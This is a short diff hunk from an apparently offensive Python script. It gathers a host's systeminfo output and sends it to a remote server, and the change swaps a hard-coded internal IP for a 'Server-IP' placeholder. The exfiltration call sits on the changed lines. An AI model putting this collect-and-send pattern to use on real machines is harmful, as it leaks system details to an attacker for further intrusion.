@@ -17,4 +17,4 @@ def send_results(result, url):
 
 if __name__ == "__main__":
     system_info = run_systeminfo()
-    send_results(system_info, 'http://172.17.53.110:443')
+    send_results(system_info, 'http://Server-IP:443')
